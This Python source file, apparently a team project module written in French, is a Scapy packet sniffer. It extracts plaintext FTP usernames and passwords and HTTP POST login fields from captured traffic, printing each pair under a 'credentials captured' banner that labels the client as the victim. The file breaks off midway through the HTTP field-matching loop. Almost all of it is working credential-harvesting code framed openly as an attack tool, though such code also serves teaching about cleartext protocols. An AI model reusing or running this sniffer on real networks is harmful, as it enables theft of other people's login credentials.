#!/usr/bin/env python3
"""
sniffer.py — MODULE B : Extraction de credentials FTP et HTTP
Auteur: Personne B
Ajoute à la version de base la détection et l'extraction des identifiants
FTP (USER/PASS) et HTTP (POST bodies avec champs username/password).
"""

import re
from scapy.all import *
from scapy.layers.http import HTTPRequest, HTTPResponse
# Note: load_layer("http") peut être nécessaire selon la version de Scapy

# Dictionnaire pour suivre les sessions FTP en cours
# Clé : (ip_src, ip_dst, sport, dport)
# Valeur : {"user": str, "password": str, "state": "USER"|"PASS"}
ftp_sessions = {}


def extract_ftp_credentials(packet):
    """
    Analyse un paquet TCP sur le port 21 (FTP).
    Détecte les commandes USER et PASS et associe les paires.
    """
    if not packet.haslayer("TCP") or not packet.haslayer("Raw"):
        return

    tcp = packet["TCP"]
    ip = packet["IP"]

    # Ne traiter que le trafic FTP (port 21)
    if tcp.sport != 21 and tcp.dport != 21:
        return

    payload = packet["Raw"].load.decode("utf-8", errors="ignore").strip()

    # Déterminer la direction : client -> serveur ou serveur -> client
    client_ip = ip.src if tcp.sport != 21 else ip.dst
    server_ip = ip.dst if tcp.sport != 21 else ip.src
    client_port = tcp.sport if tcp.sport != 21 else tcp.dport

    # Créer une clé de session unique
    session_key = (client_ip, server_ip, client_port)

    # Détection de la commande USER (client -> serveur)
    user_match = re.search(r"^USER\s+(.+)$", payload, re.IGNORECASE)
    if user_match:
        username = user_match.group(1).strip()
        if session_key not in ftp_sessions:
            ftp_sessions[session_key] = {"user": "", "password": "", "state": "USER"}
        ftp_sessions[session_key]["user"] = username
        ftp_sessions[session_key]["state"] = "USER"
        print(f"\n[FTP] USER détecté — {username}")

    # Détection de la commande PASS (client -> serveur)
    pass_match = re.search(r"^PASS\s+(.+)$", payload, re.IGNORECASE)
    if pass_match:
        password = pass_match.group(1).strip()
        if session_key not in ftp_sessions:
            ftp_sessions[session_key] = {"user": "", "password": "", "state": "PASS"}
        ftp_sessions[session_key]["password"] = password
        ftp_sessions[session_key]["state"] = "PASS"

        # Si on a déjà le username, on peut afficher la paire complète
        user = ftp_sessions[session_key].get("user", "")
        if user:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            print("\n" + "=" * 60)
            print(f"  [CREDENTIALS FTP CAPTURÉS]  @ {timestamp}")
            print(f"  Victime      : {client_ip}:{client_port}")
            print(f"  Serveur FTP  : {server_ip}:21")
            print(f"  Protocole    : FTP")
            print(f"  Username     : {user}")
            print(f"  Password     : {password}")
            print("=" * 60 + "\n")


def extract_http_credentials(packet):
    """
    Analyse les requêtes HTTP POST sur le port 80.
    Extrait les champs du body contenant des mots-clés d'authentification.
    """
    if not packet.haslayer("TCP") or not packet.haslayer("Raw"):
        return

    tcp = packet["TCP"]
    ip = packet["IP"]

    # Ne traiter que le trafic HTTP (port 80) venant du client
    if tcp.sport != 80 and tcp.dport != 80:
        return

    payload = packet["Raw"].load.decode("utf-8", errors="ignore")

    # Vérifier s'il s'agit d'une requête POST
    if not payload.startswith("POST"):
        return

    # Extraire l'URL ciblée
    url_match = re.search(r"^POST\s+(\S+)\s+HTTP", payload)
    url_targeted = url_match.group(1) if url_match else "inconnue"

    # Extraire le Host header pour l'URL complète
    host_match = re.search(r"^Host:\s*(\S+)\s*$", payload, re.MULTILINE)
    host = host_match.group(1) if host_match else ""

    # Extraire le body (après la première ligne vide)
    body_match = re.search(r"\r\n\r\n(.+)", payload, re.DOTALL)
    if not body_match:
        return

    body = body_match.group(1)

    # Mots-clés à rechercher dans les noms de champs
    keywords = [
        "password", "passwd", "pwd", "pass",
        "login", "username", "user", "email"
    ]

    credentials_found = {}
    # Analyse des paramètres POST
    params = body.split("&")
    for param in params:
        if "=" not in param:
            continue
        key, value = param.split("=", 1)
        key_lower = key.lower()
        # Vérifier si le nom du champ contient un des mots-clés